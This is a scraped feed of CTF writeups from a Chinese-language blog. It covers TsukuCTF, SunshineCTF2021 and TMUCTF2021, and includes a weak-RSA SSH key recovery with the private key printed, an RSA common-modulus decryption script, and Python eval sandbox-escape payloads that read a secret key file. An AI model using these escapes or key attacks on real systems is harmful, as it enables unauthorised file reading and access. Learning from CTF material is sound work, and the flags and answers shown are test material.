0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c ~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n bf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021 官方的Writeup给了另一种做法,可以直接得到e和n的16进制表示形式 ~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse 0:d=0 hl=4 l= 264 cons: SEQUENCE 4:d=1 hl=3 l= 129 prim: INTEGER :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19 136:d=1 hl=3 l= 129 prim: INTEGER :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF 使用RsaCtfTool生成私钥,保存至id_rsa python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private -----BEGIN RSA PRIVATE KEY----- MIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a alXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2 Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi gNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj pXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA I2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM OZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP +WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/ KS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO OgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO cP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2 /MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X -----END RSA PRIVATE KEY----- chmod 600 id_rsa ssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa flag:TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125; digitsコンピュータは高速に正しく計算してくれますが、昔のコンピュータは今ほど正確に計算できないことがありました。現在もハードウェアの故障などが原因でとても低い確率でコンピュータは計算をミスするでしょう。 運が良いあなたならこの問題が解けるはずです。10 桁の好きな数字をクエリパラメータ q に入れて、神に祈りましょう。https://tsukuctf.sechack365.com/problems/digits 访问problems/digits: &#123; &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999). example: /?q=1234567890&quot; &#125; 题目给了源码： from typing import Optional from fastapi import FastAPI import random app = FastAPI() FLAG = &quot;TsukuCTF&#123;&#125;&quot; @app.get(&quot;/&quot;) def main(q: Optional[str] = None): print(q) if q == None: return &#123; &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999). example: /?q=1234567890&quot; &#125; if len(q) != 10: return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125; if &quot;-&quot; in q or &quot;+&quot; in q: return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125; try: if not type(int(q)) is int: return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125; except: return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125; you_are_lucky = 0 for _ in range(100): idx = random.randrange(4) if q[idx] &lt; &quot;0&quot;: you_are_lucky += 1 if q[idx] &gt; &quot;9&quot;: you_are_lucky += 1 if you_are_lucky &gt; 0: return &#123;&quot;flag&quot;: FLAG&#125; else: return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125; 要求找到查询参数q的值，满足: q != None len(q) == 10 不包含-和+ 可以使用int(q)进行转换 至少包含一个0-9之外的字符 python中使用int进行强制类型转换时会忽略两侧的空格，提交q= 4567890即可 &#123; &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot; &#125; flag:TsukuCTF&#123;you_are_lucky_Tsukushi&#125;","date_published":"2021-09-22T05:38:53.000Z","tags":["CTF","CTF","TsukuCTF"]},{"id":"https://zhaoqi.vip/posts/1683940375/","url":"https://zhaoqi.vip/posts/1683940375/","title":"SunshineCTF2021 Writeup","content_html":"<h1 id=\"MultipleExponents\"><a href=\"#MultipleExponents\" class=\"headerlink\" title=\"MultipleExponents\"></a>MultipleExponents</h1><p><em>Both Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them.</em></p>\n<hr>\n<p>题目中给出了n,e1,e2,c1,c2的值,这里可以利用<a href=\"https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#_7\">RSA共模攻击</a></p>\n<pre><code class=\"python\">import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndata = &#123;&#39;n&#39;: 86683300105327745365439507825347702001838360528840593828044782382505346188827666308497121206572195142485091411381691608302239467720308057846966586611038898446400292056901615985225826651071775239736355509302701234225559345175968513640372874437860580877571155199027883755959442408968543666251138423852242301639, &#39;e1&#39;: 11048796690938982746152432997911442334648615616780223415034610235310401058533076125720945559697433984697892923155680783661955179131565701195219010273246901, &#39;e2&#39;: 9324711814017970310132549903114153787960184299541815910528651555672096706340659762220635996774790303001176856753572297256560097670723015243180488972016453,\n        &#39;c1&#39;: 84855521319828020020448068809384113135703375013574055636013459151984904926013060168559438932572351720988574536405041219757650609586761217385808427001020204262032305874206933548737826840501447182203920238204769775531537454607204301478815830436609423437869412027820433923450056939361510843151320837485348066171, &#39;c2&#39;: 54197787252581595971205193568331257218605603041941882795362450109513512664722304194032130716452909927265994263753090021761991044436678485565631063700887091405932490789561882081600940995910094939803525325448032287989826156888870845730794445212288211194966299181587885508098448750830074946100105532032186340554&#125;\nn = data[&#39;n&#39;]\ne1 = data[&#39;e1&#39;]\ne2 = data[&#39;e2&#39;]\nmessage1 = data[&#39;c1&#39;]\nmessage2 = data[&#39;c2&#39;]\n\n# s &amp; t\ngcd, s, t = gmpy2.gcdext(e1, e2)\nif s &lt; 0:\n    s = -s\n    message1 = gmpy2.invert(message1, n)\nif t &lt; 0:\n    t = -t\n    message2 = gmpy2.invert(message2, n)\nplain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n\nprint(plain)\nprint(long_to_bytes(plain).decode(&#39;utf-8&#39;))\n</code></pre>\n<p><strong>flag:</strong><code>sun&#123;d0n7_d0_m0r3_th4n_0ne_3xp0n3nt&#125;</code></p>\n<h1 id=\"DownUnder\"><a href=\"#DownUnder\" class=\"headerlink\" title=\"DownUnder\"></a>DownUnder</h1><p><em>I mentioned to a friend of mine from Australia that I like the Game Boy Advance. Apparantly, they had a mysterious cartridge they found at a Men At Work concert, and they figured to send it me to figure out what’s on it.</em></p>\n<p><em>However, I have no clue why it keeps referencing a “flag.” I ripped it already, but I can’t figure out what it’s about. Can you help me crack this code?</em></p>\n<hr>\n<p>题目中给出了一个<code>Gameboy</code>文件,放在<a href=\"https://github.com/visualboyadvance-m/visualboyadvance-m\">VisualBoxAdvance</a>里运行:</p>\n<img data-src=\"../../CTF/SunshineCTF2021/Misc/assets/DownUnder.png\" alt=\"visual-box\" style=\"zoom:50%;\" />\n\n<p>点击<code>Tools</code>-&gt;<code>Map Viewer</code>,勾选<code>Stretch to fit</code>,即可以在<code>Map</code>的底部看到flag</p>\n<img data-src=\"../../CTF/SunshineCTF2021/Misc/assets/DownUnder-Map.png\" alt=\"DownUnder-Map\" style=\"zoom:60%;\" />\n\n<p><strong>flag:</strong><code>sun&#123;n1ce_str1ngs_c0mm4nd_but_ch3cc_th3_m@p&#125;</code></p>\n<h1 id=\"ProcrastinatorProgrammer\"><a href=\"#ProcrastinatorProgrammer\" class=\"headerlink\" title=\"ProcrastinatorProgrammer\"></a>ProcrastinatorProgrammer</h1><p><em>I may have procrastinated security for <code>procrastinate.chal.2021.sunshinectf.org:65000</code>. I may have been watching too many Tom Cruise movies instead of releasing this… uh… last year.</em></p>\n<p><em>But don’t worry! The keys to the kingdom are split into three parts… you’ll never find them all!</em></p>\n<p><em>Flag will be given by our backend in the standard <code>sun&#123;&#125;</code> format, but make sure you put all the pieces together!</em></p>\n<hr>\n<ol>\n<li>Part One</li>\n</ol>\n<pre><code>Welcome to the ProcrastinatorProgrammer backend.\nPlease give me an equation! Any equation! I need to be fed some data to do some processing!I&#39;m super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!\n\nGive me an equation please!\n</code></pre>\n<p><code>eval()</code>,使用<code>open(&#39;key&#39;,&#39;r&#39;).readlines()</code>得到flag的第一部分<code>sun&#123;eval_is</code></p>\n<ol start=\"2\">\n<li>Part Two</li>\n</ol>\n<pre><code>Welcome to the ProcrastinatorProgrammer backend.\nPlease give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I&#39;ve upped my ante! Now I know it&#39;s secure!I&#39;m super secure, and can use most python math! I just use `eval(client_input, \\&#123;\\&#125;, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!\n   \nHalt in the name of the law!\n   \nWhat was the ./key found in the previous challenge?\n</code></pre>\n<p><code>eval(client_input, &#123;&#125;, safe_math_functions)</code>,使用<code>__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()</code>得到flag的第二部分<code>_safe_</code></p>\n<ol start=\"3\">\n<li>Part Three</li>\n</ol>\n<pre><code>Welcome to the ProcrastinatorProgrammer backend.\nPlease give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it&#39;s secure now! Well the second result anyhow.I&#39;m super secure, and can use a bit of python math! I just use `eval(client_input, &#123;&#39;__builtins__&#39;:\\&#123;\\&#125;&#125;)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!\n   \nHalt in the name of the law!\n   \nWhat was the ./key found in the previous challenge?\n</code></pre>\n<p><code>eval(client_input, &#123;&#39;__builtins__&#39;:&#123;&#125;&#125;)</code>,使用</p>\n<pre><code class=\"python\">[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==&quot;catch_warnings&quot;][0]()._module.__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()\n</code></pre>\n<p>得到flag的第三部分<code>only_if_you_ast_whitelist_first&#125;</code></p>\n<p><strong>flag:</strong><code>sun&#123;eval_is_safe_only_if_you_ast_whitelist_first&#125;</code></p>\n<p>参考文章:</p>\n<ul>\n<li><a href=\"http://lybniz2.sourceforge.net/safeeval.html\">safe eval</a></li>\n<li><a href=\"https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/\">python 沙箱逃逸与SSTI</a></li>\n</ul>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"MultipleExponentsBoth Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them. 题目中给出了n,e1,e2,c1,c2的值,这里可以利用RSA共模攻击 import gmpy2 from Crypto.Util.number import long_to_bytes data = &#123;&#39;n&#39;: 86683300105327745365439507825347702001838360528840593828044782382505346188827666308497121206572195142485091411381691608302239467720308057846966586611038898446400292056901615985225826651071775239736355509302701234225559345175968513640372874437860580877571155199027883755959442408968543666251138423852242301639, &#39;e1&#39;: 11048796690938982746152432997911442334648615616780223415034610235310401058533076125720945559697433984697892923155680783661955179131565701195219010273246901, &#39;e2&#39;: 9324711814017970310132549903114153787960184299541815910528651555672096706340659762220635996774790303001176856753572297256560097670723015243180488972016453, &#39;c1&#39;: 84855521319828020020448068809384113135703375013574055636013459151984904926013060168559438932572351720988574536405041219757650609586761217385808427001020204262032305874206933548737826840501447182203920238204769775531537454607204301478815830436609423437869412027820433923450056939361510843151320837485348066171, &#39;c2&#39;: 54197787252581595971205193568331257218605603041941882795362450109513512664722304194032130716452909927265994263753090021761991044436678485565631063700887091405932490789561882081600940995910094939803525325448032287989826156888870845730794445212288211194966299181587885508098448750830074946100105532032186340554&#125; n = data[&#39;n&#39;] e1 = data[&#39;e1&#39;] e2 = data[&#39;e2&#39;] message1 = data[&#39;c1&#39;] message2 = data[&#39;c2&#39;] # s &amp; t gcd, s, t = gmpy2.gcdext(e1, e2) if s &lt; 0: s = -s message1 = gmpy2.invert(message1, n) if t &lt; 0: t = -t message2 = gmpy2.invert(message2, n) plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n print(plain) print(long_to_bytes(plain).decode(&#39;utf-8&#39;)) flag:sun&#123;d0n7_d0_m0r3_th4n_0ne_3xp0n3nt&#125; DownUnderI mentioned to a friend of mine from Australia that I like the Game Boy Advance. Apparantly, they had a mysterious cartridge they found at a Men At Work concert, and they figured to send it me to figure out what’s on it. However, I have no clue why it keeps referencing a “flag.” I ripped it already, but I can’t figure out what it’s about. Can you help me crack this code? 题目中给出了一个Gameboy文件,放在VisualBoxAdvance里运行: 点击Tools-&gt;Map Viewer,勾选Stretch to fit,即可以在Map的底部看到flag flag:sun&#123;n1ce_str1ngs_c0mm4nd_but_ch3cc_th3_m@p&#125; ProcrastinatorProgrammerI may have procrastinated security for procrastinate.chal.2021.sunshinectf.org:65000. I may have been watching too many Tom Cruise movies instead of releasing this… uh… last year. But don’t worry! The keys to the kingdom are split into three parts… you’ll never find them all! Flag will be given by our backend in the standard sun&#123;&#125; format, but make sure you put all the pieces together! Part One Welcome to the ProcrastinatorProgrammer backend. Please give me an equation! Any equation! I need to be fed some data to do some processing!I&#39;m super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key! Give me an equation please! eval(),使用open(&#39;key&#39;,&#39;r&#39;).readlines()得到flag的第一部分sun&#123;eval_is Part Two Welcome to the ProcrastinatorProgrammer backend. Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I&#39;ve upped my ante! Now I know it&#39;s secure!I&#39;m super secure, and can use most python math! I just use `eval(client_input, \\&#123;\\&#125;, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key! Halt in the name of the law! What was the ./key found in the previous challenge? eval(client_input, &#123;&#125;, safe_math_functions),使用__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()得到flag的第二部分_safe_ Part Three Welcome to the ProcrastinatorProgrammer backend. Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it&#39;s secure now! Well the second result anyhow.I&#39;m super secure, and can use a bit of python math! I just use `eval(client_input, &#123;&#39;__builtins__&#39;:\\&#123;\\&#125;&#125;)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key! Halt in the name of the law! What was the ./key found in the previous challenge? eval(client_input, &#123;&#39;__builtins__&#39;:&#123;&#125;&#125;),使用 [x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==&quot;catch_warnings&quot;][0]()._module.__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read() 得到flag的第三部分only_if_you_ast_whitelist_first&#125; flag:sun&#123;eval_is_safe_only_if_you_ast_whitelist_first&#125; 参考文章: safe eval python 沙箱逃逸与SSTI","summary":"MultipleExponentsBoth Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them. 题目中给出了n,e1,e2,c1,c2的值,这里可以利用RSA共模攻击 import gmpy2 from Crypto.Util.number import long_to_bytes data = &#123;&#39;n&#39;: 86683300105327745365439507825347702001838360528840593828044782382505346188827666308497121206572195142485091411381691608302239467720308057846966586611038898446400292056901615985225826651071775239736355509302701234225559345175968513640372874437860580877571155199027883755959442408968543666251138423852242301639, &#39;e1&#39;: 11048796690938982746152432997911442334648615616780223415034610235310401058533076125720945559697433984697892923155680783661955179131565701195219010273246901, &#39;e2&#39;: 9324711814017970310132549903114153787960184299541815910528651555672096706340659762220635996774790303001176856753572297256560097670723015243180488972016453, &#39;c1&#39;: 84855521319828020020448068809384113135703375013574055636013459151984904926013060168559438932572351720988574536405041219757650609586761217385808427001020204262032305874206933548737826840501447182203920238204769775531537454607204301478815830436609423437869412027820433923450056939361510843151320837485348066171, &#39;c2&#39;: 54197787252581595971205193568331257218605603041941882795362450109513512664722304194032130716452909927265994263753090021761991044436678485565631063700887091405932490789561882081600940995910094939803525325448032287989826156888870845730794445212288211194966299181587885508098448750830074946100105532032186340554&#125; n = data[&#39;n&#39;] e1 = data[&#39;e1&#39;] e2 = data[&#39;e2&#39;] message1 = data[&#39;c1&#39;] message2 = data[&#39;c2&#39;] # s &amp; t gcd, s, t = gmpy2.gcdext(e1, e2) if s &lt; 0: s = -s message1 = gmpy2.invert(message1, n) if t &lt; 0: t = -t message2 = gmpy2.invert(message2, n) plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n print(plain) print(long_to_bytes(plain).decode(&#39;utf-8&#39;)) flag:sun&#123;d0n7_d0_m0r3_th4n_0ne_3xp0n3nt&#125; DownUnderI mentioned to a friend of mine from Australia that I like the Game Boy Advance. Apparantly, they had a mysterious cartridge they found at a Men At Work concert, and they figured to send it me to figure out what’s on it. However, I have no clue why it keeps referencing a “flag.” I ripped it already, but I can’t figure out what it’s about. Can you help me crack this code? 题目中给出了一个Gameboy文件,放在VisualBoxAdvance里运行: 点击Tools-&gt;Map Viewer,勾选Stretch to fit,即可以在Map的底部看到flag flag:sun&#123;n1ce_str1ngs_c0mm4nd_but_ch3cc_th3_m@p&#125; ProcrastinatorProgrammerI may have procrastinated security for procrastinate.chal.2021.sunshinectf.org:65000. I may have been watching too many Tom Cruise movies instead of releasing this… uh… last year. But don’t worry! The keys to the kingdom are split into three parts… you’ll never find them all! Flag will be given by our backend in the standard sun&#123;&#125; format, but make sure you put all the pieces together! Part One Welcome to the ProcrastinatorProgrammer backend. Please give me an equation! Any equation! I need to be fed some data to do some processing!I&#39;m super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key! Give me an equation please! eval(),使用open(&#39;key&#39;,&#39;r&#39;).readlines()得到flag的第一部分sun&#123;eval_is Part Two Welcome to the ProcrastinatorProgrammer backend. Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I&#39;ve upped my ante! Now I know it&#39;s secure!I&#39;m super secure, and can use most python math! I just use `eval(client_input, \\&#123;\\&#125;, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key! Halt in the name of the law! What was the ./key found in the previous challenge? eval(client_input, &#123;&#125;, safe_math_functions),使用__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()得到flag的第二部分_safe_ Part Three Welcome to the ProcrastinatorProgrammer backend. Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it&#39;s secure now! Well the second result anyhow.I&#39;m super secure, and can use a bit of python math! I just use `eval(client_input, &#123;&#39;__builtins__&#39;:\\&#123;\\&#125;&#125;)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key! Halt in the name of the law! What was the ./key found in the previous challenge? eval(client_input, &#123;&#39;__builtins__&#39;:&#123;&#125;&#125;),使用 [x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==&quot;catch_warnings&quot;][0]()._module.__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read() 得到flag的第三部分only_if_you_ast_whitelist_first&#125; flag:sun&#123;eval_is_safe_only_if_you_ast_whitelist_first&#125; 参考文章: safe eval python 沙箱逃逸与SSTI","date_published":"2021-09-21T15:38:47.000Z","tags":["CTF","CTF","SunshineCTF"]},{"id":"https://zhaoqi.vip/posts/500717398/","url":"https://zhaoqi.vip/posts/500717398/","title":"TMUCTF2021 Writeup","content_html":"<h1 id=\"Puzzle\"><a href=\"#Puzzle\" class=\"headerlink\" title=\"Puzzle\"></a>Puzzle</h1><p><em>Life is a puzzle!</em></p>\n<hr>\n<p>给了一张图片,首先使用<code>binwalk</code>提取一下文件,得到一个有密码的压缩文件和一张图片.</p>\n<img data-src=\"../../CTF/TMUCTF2021/Misc/assets/puzzle.png\" style=\"zoom:40%;\" />\n\n<p>观察图片发现,第一位数字表示行号,剩下的数字是在描述上一行数字的个数.</p>\n<p>例如,从12-&gt;11112是:先写一个1表示行号,上一行有1个1、1个2,加上11和12即可得到11112.</p>\n<p>依次类推,得到压缩包的解压密码<code>?</code>是<code>61542142311</code>.</p>\n<p>输入密码,解压得到<code>flag.txt</code>:</p>\n<p><code>R1pIUEdTe1EzeV9NM19RNDU3NHpfRTRzNzBfVzRhX1U0el9PMV9RM3kwX1c0YV9QdTAwYV9YMGE0en0=</code></p>\n<p>base64解码一下:</p>\n<p><code>GZHPGS&#123;Q3y_M3_Q4574z_E4s70_W4a_U4z_O1_Q3y0_W4a_Pu00a_X0a4z&#125;</code></p>\n<p>ROT13解密一下:</p>\n<p><code>TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125;</code></p>\n<p><strong>flag:</strong><code>TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125;</code></p>\n<h1 id=\"Too-Much\"><a href=\"#Too-Much\" class=\"headerlink\" title=\"Too Much\"></a>Too Much</h1><p><em>I found a program that generates the flag of this challenge, but the implementation of one of its functions is not available. This function seems simple, but I am confused because of the large number of numbers! Can you help me find the flag before the competition is over?!</em></p>\n<hr>\n<p>题目给了一个包含1000000个数字的文件<code>numbers.txt</code>,要求编写一个函数:对于给定的x,在<code>numbers.txt</code>中找到两个数y和z,要求满足y !&#x3D; z 和 (y + z) &#x3D;&#x3D; x,返回不重复的(y,z)的个数.</p>\n<p>利用哈希数组的思想,将时间复杂度降到O(n):</p>\n<pre><code class=\"python\">def func2(x):\n    &quot;&quot;&quot;\n    Returns the number of distinct pairs (y, z) from the numbers in the file &quot;numbers.txt&quot; whose y != z and (y + z) == x\n    Note that two pairs (y, z) and (z, y) are considered the same and are counted only once\n    &quot;&quot;&quot;\n    with open(&#39;numbers.txt&#39;, &#39;r&#39;) as f:\n        data = [int(_) for _ in f.readlines()]\n\n    length = max(data) + 1\n    hash_arr = [False] * (length)\n\n    for t in data:\n        hash_arr[t] = True\n    ans = 0\n    for y in data:\n        z = x-y\n        if z &gt; 0 and hash_arr[z]:\n            if y != z:\n                ans += 1\n    print(chr(ans//2))\n    return ans // 2\n\ndef get_flag(res):\n    flag = []\n    for i in range(len(res)):\n        flag.append(chr(func2(res[i])))\n    flag = &#39;&#39;.join(flag)\n    return flag\n\nif __name__ == &quot;__main__&quot;:\n    res = [751741232, 519127658, 583555720, 3491231752, 3333111256, 481365731, 982100628, 1001121327, 3520999746,\n           915725624, 3218509573, 3621224627, 3270950626, 3321456817, 3091205444, 999888800, 475855017, 448213157,\n           3222412857, 820711846, 3710211491, 3119823672, 3333211607, 812955676, 971211391, 3210953872, 289789909,\n           781213400, 578265122, 910021887, 653886578, 3712776506, 229812345, 582319118, 1111276998, 1151016390,\n           700123328, 1074521304, 3210438183, 817210125, 501231350, 753244584, 3240911853, 415234677, 469125436,\n           592610671, 612980665, 291821367, 344199617, 1011100412, 681623864, 897219249, 3132267885, 565913000,\n           301203203, 3100544737, 432812663, 1012813485, 510928797, 671553831, 3216409218, 3191288433, 698777123,\n           3512778698, 810476845, 3102989588, 3621432709, 812321695, 526486561, 378912454, 3316207359, 623111580,\n           344209171, 537454826, 691277475, 2634678623, 1112182335, 792111856, 762989676, 666210267, 871278369,\n           581009345, 391231132, 921732469, 717217468, 3101412929, 3101217354, 831912337, 532666530, 701012510,\n           601365919, 492699680, 2843119525]\n    print(&quot;The flag is&quot;, get_flag(res))\n</code></pre>\n<pre><code>The flag is TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125;\n</code></pre>\n<p><strong>flag:</strong><code>TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125;</code></p>\n<h1 id=\"The-Foreign-Student\"><a href=\"#The-Foreign-Student\" class=\"headerlink\" title=\"The Foreign Student\"></a>The Foreign Student</h1><p><em>Tarbiat Modares University has a foreign student. His name is Zedmondo. He has a</em> very shady character. He always walks alone, eats alone, and never talks much.There are some rumors about him. Some people say he is a genius sociopath; some say he is just too self-involved. But one thing is obvious; he has a secret.Once, one of the students heard that he was talking about receiving some important documents via a private email. Maybe if we find his email, we can learn about his secret.*</p>\n<hr>\n<p>题目是要我们找一个叫<code>Zedmondo</code>的大学生的<code>private email</code></p>\n<p>首先,用Google搜索<code>Zedmondo Tarbiat Modares University</code>,找到这个人的<a href=\"https://ir.linkedin.com/in/zedmondo-zaberini-203b33206\">Linkedin主页</a></p>\n<img data-src=\"../../CTF/TMUCTF2021/Osint/assets/linkedin.png\" alt=\"Zedmondo 领英\" style=\"zoom:80%;\" />\n\n<p>除了一个Github链接外(<a href=\"https://github.com/ZedZini\">https://github.com/ZedZini</a>),没有什么其他有价值的信息</p>\n<p>浏览Github上的仓库,结合题目中的<code>he has a secret.</code>,一个仓库<a href=\"https://github.com/ZedZini/secretkey\">https://github.com/ZedZini/secretkey</a>的<code>README</code>引起了我的注意.</p>\n<pre><code># secretkey\nIt is a public key. Not really a secret, right?!\n</code></pre>\n<p>与<code>README</code>一起的还有一个<a href=\"https://github.com/ZedZini/secretkey/blob/main/0xEB0B6528-pub.asc\">PGP公钥文件</a>:</p>\n<pre><code>-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: Keybase OpenPGP v1.0.0\nComment: https://keybase.io/crypto\n\nxsFNBGAqSQ8BEADZtFG6grS2QP9afsA7SmT85TpxcSmG5LGLmSHKgI47ZwS+dPrO\nSzChR0Jt3vI7BjA3WVlxQp94XTqRqFrjtJkS2I3nO3I94jhLu0AwfoiskKzyl+tQ\n...\n-----END PGP PUBLIC KEY BLOCK-----\n</code></pre>\n<p>访问<a href=\"https://keybase.io/crypto\">https://keybase.io/crypto</a>,发现网站上已经给出了使用说明:</p>\n<pre><code class=\"shell\">Using the Keybase command line app\nkeybase pgp encrypt -m &quot;message&quot; [them]\nWith GPG or another PGP program\nYou may import from Keybase to GPG easily and then perform whatever cryptographic actions you want.\n\n# using curl\ncurl https://keybase.io/[them]/key.asc | gpg --import\n\n# using `keybase pgp pull` which\n# imports to GPG key chain for you\nkeybase follow [them]\nkeybase pgp pull [them]\n</code></pre>\n<p>参照使用说明:</p>\n<pre><code class=\"shell\">curl https://raw.githubusercontent.com/ZedZini/secretkey/main/0xEB0B6528-pub.asc | gpg --import\n\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  \ngpg: 目录‘/Users/zhaoqi219/.gnupg’已创建\ngpg: 钥匙箱‘/Users/zhaoqi219/.gnupg/pubring.kbx’已创建\n100  6139  100  6139    0     0   4494      0  0:00:01  0:00:01 --:--:--  4490\ngpg: /Users/zhaoqi219/.gnupg/trustdb.gpg：建立了信任度数据库\ngpg: 密钥 586DD615EB0B6528：公钥 “Zedmondo Zaberini (Nothing to say...) &lt;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&gt;” 已导入\ngpg: 处理的总数：1\ngpg:               已导入：1\n</code></pre>\n<p><strong>flag:</strong> 